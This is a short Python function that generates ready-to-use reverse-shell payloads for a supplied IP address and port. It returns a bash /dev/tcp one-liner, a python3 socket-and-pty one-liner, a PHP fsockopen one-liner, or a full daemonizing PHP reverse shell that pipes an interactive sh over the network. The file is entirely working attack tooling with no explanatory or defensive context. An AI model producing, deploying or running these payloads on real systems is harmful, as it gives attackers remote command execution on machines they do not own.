def generate_shell(ip, port, shell_type):

    if shell_type == "bash":
        return f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"

    elif shell_type == "python":
        return f"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'"

    elif shell_type == "php":
        return f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"

    elif shell_type == "php-rev":
        return f"""<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = '{ip}';
$port = {port};
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {{
    $pid = pcntl_fork();
    if ($pid == -1) {{
        exit(1);
    }}
    if ($pid) {{
        exit(0);
    }}
    if (posix_setsid() == -1) {{
        exit(1);
    }}
    $daemon = 1;
}}

chdir("/");
umask(0);

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {{
    exit(1);
}}

$descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("pipe", "w")
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {{
    exit(1);
}}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

while (1) {{
    if (feof($sock)) {{
        break;
    }}
    if (feof($pipes[1])) {{
        break;
    }}

    $read_a = array($sock, $pipes[1], $pipes[2]);
    stream_select($read_a, $write_a, $error_a, null);

    if (in_array($sock, $read_a)) {{
        $input = fread($sock, $chunk_size);
        fwrite($pipes[0], $input);
    }}

    if (in_array($pipes[1], $read_a)) {{
        $input = fread($pipes[1], $chunk_size);
        fwrite($sock, $input);
    }}

    if (in_array($pipes[2], $read_a)) {{
        $input = fread($pipes[2], $chunk_size);
        fwrite($sock, $input);
    }}
}}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
?>"""

    else:
        return "[-] Invalid shell type"
